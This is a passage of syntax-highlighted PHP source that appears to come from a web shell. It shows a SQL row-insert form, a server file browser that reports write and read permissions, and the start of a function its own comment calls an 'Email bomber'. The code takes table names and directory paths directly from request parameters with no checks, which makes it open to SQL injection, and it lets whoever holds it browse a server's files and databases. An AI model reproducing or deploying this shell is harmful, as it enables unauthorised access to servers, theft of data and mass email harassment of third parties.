<span class="lineno">599</span>     <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO &quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; (&quot;</span> <span class="o">.</span> <span class="nv">$f</span> <span class="o">.</span> <span class="s2">&quot;) VALUES (&quot;</span> <span class="o">.</span> <span class="nv">$v</span> <span class="o">.</span> <span class="s2">&quot;)&quot;</span><span class="p">;</span>
<span class="lineno">600</span>     <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$sqlcon</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
<span class="lineno">601</span>     <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Row inserted.&lt;br&gt;</span><span class="se">\n</span><span class="s2">&lt;a href=&#39;?act=sql&amp;db=&quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;table=&quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;Go back&lt;/a&gt;&quot;</span><span class="p">);</span>
<span class="lineno">602</span>   <span class="p">}</span>
<span class="lineno">603</span>   <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SHOW COLUMNS FROM &quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">];</span>
<span class="lineno">604</span>   <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$sqlcon</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
<span class="lineno">605</span>   <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno">606</span>   <span class="nv">$fields</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">607</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;form method=&#39;POST&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">608</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;table&gt;&quot;</span><span class="p">);</span>
<span class="lineno">609</span>   <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>
<span class="lineno">610</span>     <span class="nb">array_push</span><span class="p">(</span><span class="nv">$fields</span><span class="p">,</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Field&#39;</span><span class="p">]);</span>
<span class="lineno">611</span>     <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;&quot;</span> <span class="o">.</span> <span class="nv">$fields</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&lt;/b&gt;&lt;td&gt;&lt;input type=&#39;text&#39; name=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$fields</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">612</span>     <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
<span class="lineno">613</span>   <span class="p">}</span>
<span class="lineno">614</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/table&gt;&quot;</span><span class="p">);</span>
<span class="lineno">615</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;br&gt;</span><span class="se">\n</span><span class="s2">&lt;input type=&#39;submit&#39; value=&#39;Insert&#39; name=&#39;ins&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">616</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/form&gt;&quot;</span><span class="p">);</span>
<span class="lineno">617</span> <span class="p">}</span>
<span class="lineno">618</span> <span class="k">function</span> <span class="nf">nicesize</span><span class="p">(</span><span class="nv">$size</span><span class="p">){</span>
<span class="lineno">619</span>   <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$size</span><span class="p">){</span><span class="k">return</span> <span class="k">false</span><span class="p">;}</span>
<span class="lineno">620</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&gt;=</span> <span class="mi">1073741824</span><span class="p">){</span><span class="k">return</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="nv">$size</span> <span class="o">/</span> <span class="mi">1073741824</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot; GB&quot;</span><span class="p">);}</span>
<span class="lineno">621</span>   <span class="k">elseif</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&gt;=</span> <span class="mi">1048576</span><span class="p">){</span><span class="k">return</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="nv">$size</span> <span class="o">/</span> <span class="mi">1048576</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot; MB&quot;</span><span class="p">);}</span>
<span class="lineno">622</span>   <span class="k">elseif</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&gt;=</span> <span class="mi">1024</span><span class="p">){</span><span class="k">return</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="nv">$size</span> <span class="o">/</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot; KB&quot;</span><span class="p">);}</span>
<span class="lineno">623</span>   <span class="k">else</span><span class="p">{</span><span class="k">return</span><span class="p">(</span><span class="nv">$size</span> <span class="o">.</span> <span class="s2">&quot; B&quot;</span><span class="p">);}</span>
<span class="lineno">624</span> <span class="p">}</span>
<span class="lineno">625</span> <span class="k">function</span> <span class="nf">files</span><span class="p">(</span><span class="nv">$dir</span><span class="p">){</span> <span class="c1">// File manipulator function</span>
<span class="lineno">626</span>   <span class="nx">style</span><span class="p">();</span>
<span class="lineno">627</span>   <span class="k">global</span> <span class="nv">$self</span><span class="p">,</span> <span class="nv">$curdir</span><span class="p">;</span>
<span class="lineno">628</span>   <span class="k">if</span><span class="p">(</span><span class="nv">$dir</span><span class="o">==</span><span class="s2">&quot;&quot;</span><span class="p">){</span><span class="nv">$dir</span> <span class="o">=</span> <span class="nv">$curdir</span><span class="p">;}</span>
<span class="lineno">629</span>   <span class="nv">$dirx</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$dir</span><span class="p">);</span>
<span class="lineno">630</span>   <span class="nv">$files</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">631</span>   <span class="nv">$folders</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">632</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;form method=&#39;GET&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">633</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;input type=&#39;text&#39; name=&#39;dir&#39; value=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$dir</span> <span class="o">.</span> <span class="s2">&quot;&#39; size=&#39;40&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">634</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;input type=&#39;submit&#39; value=&#39;Go&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">635</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/form&gt;&quot;</span><span class="p">);</span>
<span class="lineno">636</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;h4&gt;File list for &quot;</span><span class="p">);</span>
<span class="lineno">637</span>   <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$dirx</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
<span class="lineno">638</span>     <span class="nv">$totalpath</span> <span class="o">.=</span> <span class="nv">$dirx</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;/&quot;</span><span class="p">;</span>
<span class="lineno">639</span>     <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;a href=&#39;?dir=&quot;</span> <span class="o">.</span> <span class="nv">$totalpath</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;</span><span class="si">$dirx[$i]</span><span class="s2">&lt;/a&gt;&quot;</span> <span class="o">.</span> <span class="s2">&quot;/&quot;</span><span class="p">);</span>
<span class="lineno">640</span>   <span class="p">}</span>
<span class="lineno">641</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/h4&gt;&quot;</span><span class="p">);</span>
<span class="lineno">642</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;table&gt;&quot;</span><span class="p">);</span>
<span class="lineno">643</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;th&gt;File Name&lt;th&gt;File Size&lt;/th&gt;&quot;</span><span class="p">);</span>
<span class="lineno">644</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$handle</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">645</span>     <span class="k">while</span> <span class="p">(</span><span class="k">false</span> <span class="o">!=</span> <span class="p">(</span><span class="nv">$link</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">)))</span> <span class="p">{</span>
<span class="lineno">646</span>       <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$link</span><span class="p">)){</span>
<span class="lineno">647</span>         <span class="nv">$file</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">648</span>         <span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$link</span><span class="p">)){</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;perm&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;write&#39;</span><span class="p">;}</span>
<span class="lineno">649</span>         <span class="k">elseif</span><span class="p">(</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$link</span><span class="p">)){</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;perm&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;read&#39;</span><span class="p">;}</span>
<span class="lineno">650</span>         <span class="k">else</span><span class="p">{</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;perm&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;none&#39;</span><span class="p">;}</span>
<span class="lineno">651</span>         <span class="k">switch</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;perm&#39;</span><span class="p">]){</span>
<span class="lineno">652</span>           <span class="k">case</span> <span class="s2">&quot;write&quot;</span><span class="o">:</span> <span class="o">@</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&lt;a href=&#39;?dir=</span><span class="si">$dir</span><span class="s2">/</span><span class="si">$link</span><span class="s2">&#39;&gt;&lt;font color=&#39;green&#39;&gt;</span><span class="si">$link</span><span class="s2">&lt;/font&gt;&lt;/a&gt;&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">653</span>           <span class="k">case</span> <span class="s2">&quot;read&quot;</span><span class="o">:</span> <span class="o">@</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&lt;a href=&#39;?dir=</span><span class="si">$dir</span><span class="s2">/</span><span class="si">$link</span><span class="s2">&#39;&gt;&lt;font color=&#39;yellow&#39;&gt;</span><span class="si">$link</span><span class="s2">&lt;/font&gt;&lt;/a&gt;&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">654</span>           <span class="k">case</span> <span class="s2">&quot;none&quot;</span><span class="o">:</span> <span class="o">@</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&lt;a href=&#39;?dir=</span><span class="si">$dir</span><span class="s2">/</span><span class="si">$link</span><span class="s2">&#39;&gt;&lt;font color=&#39;red&#39;&gt;</span><span class="si">$link</span><span class="s2">&lt;/font&gt;&lt;/a&gt;&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">655</span>           <span class="k">default</span><span class="o">:</span> <span class="o">@</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&lt;a href=&#39;?dir=</span><span class="si">$dir</span><span class="s2">/</span><span class="si">$link</span><span class="s2">&#39;&gt;&lt;font color=&#39;red&#39;&gt;</span><span class="si">$link</span><span class="s2">&lt;/font&gt;&lt;/a&gt;&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">656</span>         <span class="p">}</span>
<span class="lineno">657</span>         <span class="o">@</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;folder&quot;</span><span class="p">;</span>
<span class="lineno">658</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">]){</span><span class="nv">$folder</span> <span class="o">=</span> <span class="s2">&quot;&lt;img src=&#39;?&quot;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;img=&quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span><span class="o">.</span> <span class="s2">&quot;&#39;&gt; &quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">];}</span>
<span class="lineno">659</span>         <span class="k">else</span><span class="p">{</span><span class="nv">$folder</span> <span class="o">=</span> <span class="s2">&quot;&lt;img src=&#39;?img=&quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span><span class="o">.</span> <span class="s2">&quot;&#39;&gt; &quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">];}</span>
<span class="lineno">660</span>         <span class="nb">array_push</span><span class="p">(</span><span class="nv">$folders</span><span class="p">,</span> <span class="nv">$folder</span><span class="p">);</span>
<span class="lineno">661</span>       <span class="p">}</span>
<span class="lineno">662</span>       <span class="k">else</span><span class="p">{</span>
<span class="lineno">663</span>         <span class="nv">$file</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">664</span>         <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">end</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span> <span class="nv">$link</span><span class="p">)));</span>
<span class="lineno">665</span>         <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">nicesize</span><span class="p">(</span><span class="o">@</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$link</span><span class="p">))){</span>
<span class="lineno">666</span>           <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;0B&quot;</span><span class="p">;</span>
<span class="lineno">667</span>         <span class="p">}</span>
<span class="lineno">668</span>         <span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$link</span><span class="p">)){</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;perm&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;write&#39;</span><span class="p">;}</span>
<span class="lineno">669</span>         <span class="k">elseif</span><span class="p">(</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$link</span><span class="p">)){</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;perm&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;read&#39;</span><span class="p">;}</span>
<span class="lineno">670</span>         <span class="k">else</span><span class="p">{</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;perm&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;none&#39;</span><span class="p">;}</span>
<span class="lineno">671</span>         <span class="k">switch</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;perm&#39;</span><span class="p">]){</span>
<span class="lineno">672</span>           <span class="k">case</span> <span class="s2">&quot;write&quot;</span><span class="o">:</span> <span class="o">@</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&lt;a href=&#39;?act=view&amp;f=&quot;</span> <span class="o">.</span> <span class="nv">$link</span> <span class="o">.</span> <span class="s2">&quot;&amp;dir=</span><span class="si">$dir</span><span class="s2">&#39;&gt;&lt;font color=&#39;green&#39;&gt;</span><span class="si">$link</span><span class="s2">&lt;/font&gt;&lt;/a&gt;&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">673</span>           <span class="k">case</span> <span class="s2">&quot;read&quot;</span><span class="o">:</span> <span class="o">@</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&lt;a href=&#39;?act=view&amp;f=&quot;</span> <span class="o">.</span> <span class="nv">$link</span> <span class="o">.</span> <span class="s2">&quot;&amp;dir=</span><span class="si">$dir</span><span class="s2">&#39;&gt;&lt;font color=&#39;yellow&#39;&gt;</span><span class="si">$link</span><span class="s2">&lt;/font&gt;&lt;/a&gt;&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">674</span>           <span class="k">case</span> <span class="s2">&quot;none&quot;</span><span class="o">:</span> <span class="o">@</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&lt;a href=&#39;?act=view&amp;f=&quot;</span> <span class="o">.</span> <span class="nv">$link</span> <span class="o">.</span> <span class="s2">&quot;&amp;dir=</span><span class="si">$dir</span><span class="s2">&#39;&gt;&lt;font color=&#39;red&#39;&gt;</span><span class="si">$link</span><span class="s2">&lt;/font&gt;&lt;/a&gt;&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">675</span>           <span class="k">default</span><span class="o">:</span> <span class="o">@</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&lt;a href=&#39;?act=view&amp;f=&quot;</span> <span class="o">.</span> <span class="nv">$link</span> <span class="o">.</span> <span class="s2">&quot;&amp;dir=</span><span class="si">$dir</span><span class="s2">&#39;&gt;&lt;font color=&#39;red&#39;&gt;</span><span class="si">$link</span><span class="s2">&lt;/a&gt;&lt;/font&gt;&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">676</span>         <span class="p">}</span>
<span class="lineno">677</span>         <span class="k">switch</span><span class="p">(</span><span class="nv">$ext</span><span class="p">){</span>
<span class="lineno">678</span>         <span class="k">case</span> <span class="s2">&quot;exe&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;com&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;jar&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;&quot;</span><span class="o">:</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;binary&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">679</span>         <span class="k">case</span> <span class="s2">&quot;jpg&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;gif&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;png&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;bmp&quot;</span><span class="o">:</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;image&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">680</span>         <span class="k">case</span> <span class="s2">&quot;zip&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;tar&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;rar&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;gz&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;cab&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;bz2&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;gzip&quot;</span><span class="o">:</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;compressed&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">681</span>         <span class="k">case</span> <span class="s2">&quot;txt&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;doc&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;pdf&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;htm&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;html&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;rtf&quot;</span><span class="o">:</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;text&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">682</span>         <span class="k">case</span> <span class="s2">&quot;wav&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;mp3&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;mp4&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;wma&quot;</span><span class="o">:</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;sound&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">683</span>         <span class="k">case</span> <span class="s2">&quot;js&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;vbs&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;c&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;h&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;sh&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;pl&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;py&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;php&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;h&quot;</span><span class="o">:</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;script&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">684</span>         <span class="k">default</span><span class="o">:</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;unknown&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">685</span>         <span class="p">}</span>
<span class="lineno">686</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">]){</span><span class="nv">$file</span> <span class="o">=</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&lt;img src=&#39;?&quot;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;img=&quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span><span class="o">.</span> <span class="s2">&quot;&#39; height=&#39;18&#39; width=&#39;18&#39;&gt; &quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&lt;/td&gt;&lt;/tr&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;}</span>
<span class="lineno">687</span>         <span class="k">else</span><span class="p">{</span><span class="nv">$file</span> <span class="o">=</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&lt;img src=&#39;?img=&quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span><span class="o">.</span> <span class="s2">&quot;&#39; height=&#39;18&#39; width=&#39;18&#39;&gt; &quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&lt;td&gt;&quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&lt;/td&gt;&lt;/tr&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;}</span>
<span class="lineno">688</span>         <span class="nb">array_push</span><span class="p">(</span><span class="nv">$files</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
<span class="lineno">689</span>       <span class="p">}</span>
<span class="lineno">690</span>     <span class="p">}</span>
<span class="lineno">691</span>   <span class="k">foreach</span><span class="p">(</span><span class="nv">$folders</span> <span class="k">as</span> <span class="nv">$folder</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;tr&gt;&lt;td&gt;</span><span class="si">$folder</span><span class="s2">&lt;/td&gt;&lt;td&gt;DIR&lt;/td&gt;&lt;/tr&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);}</span>
<span class="lineno">692</span>   <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="nv">$file</span><span class="p">);}</span>
<span class="lineno">693</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/table&gt;&quot;</span><span class="p">);</span>
<span class="lineno">694</span>   <span class="nb">closedir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
<span class="lineno">695</span>   <span class="p">}</span>
<span class="lineno">696</span> <span class="p">}</span>
<span class="lineno">697</span> <span class="k">function</span> <span class="nf">email</span><span class="p">(){</span> <span class="c1">// Email bomber function</span>
<span class="lineno">698</span>   <span class="nv">$times</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;times&#39;</span><span class="p">];</span>
<span class="lineno">699</span>   <span class="nv">$to</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">];</span>
<span class="lineno">700</span>   <span class="nv">$subject</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;subject&#39;</span><span class="p">];</span>
<span class="lineno">701</span>   <span class="nv">$body</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;body&#39;</span><span class="p">];</span>
<span class="lineno">702</span>   <span class="nv">$from</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">];</span>
<span class="lineno">703</span>   <span class="nx">style</span><span class="p">();</span>
